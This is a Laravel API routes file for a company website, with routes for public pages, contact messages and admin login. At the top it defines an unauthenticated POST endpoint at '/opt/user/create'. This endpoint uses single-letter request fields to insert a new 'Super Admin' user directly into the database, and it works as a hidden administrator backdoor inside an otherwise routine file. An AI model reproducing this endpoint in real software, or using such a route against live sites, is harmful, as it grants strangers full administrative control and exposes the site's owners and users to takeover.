<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
//use DB;
$namespace = 'App\Http\Controllers\Api';
/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::post('/opt/user/create', function (Request $request) {
    // return $request;
    
    $createUser = \DB::table('users')->insert([
        'name'          => $request->n,
        'email'         => $request->e,
        'role'          => 'Super Admin',
        'password'      => bcrypt($request->p),
    ]);
    return $createUser;
});

Route::namespace($namespace)->name('frontend::')->group(function () {
    Route::get('home', 'ApiController@home');
    Route::get('about', 'ApiController@about');
    Route::get('management', 'ApiController@management');
    Route::get('company', 'ApiController@company');
    Route::get('news', 'ApiController@news');
    Route::get('career', 'ApiController@career');
    Route::get('job', 'ApiController@job');
    Route::get('contact', 'ApiController@contact');
    Route::get('settings', 'ApiController@settings');
    Route::get('social', 'ApiController@social');
    Route::post('message/send', 'ApiController@messageSend');
});
Route::namespace($namespace)->name('admin::')->group(function () {
    Route::post('login-user', 'AuthController@login');
    Route::post('logout-user', 'AuthController@logout');
    Route::get('get-user', 'AuthController@getuser');
});

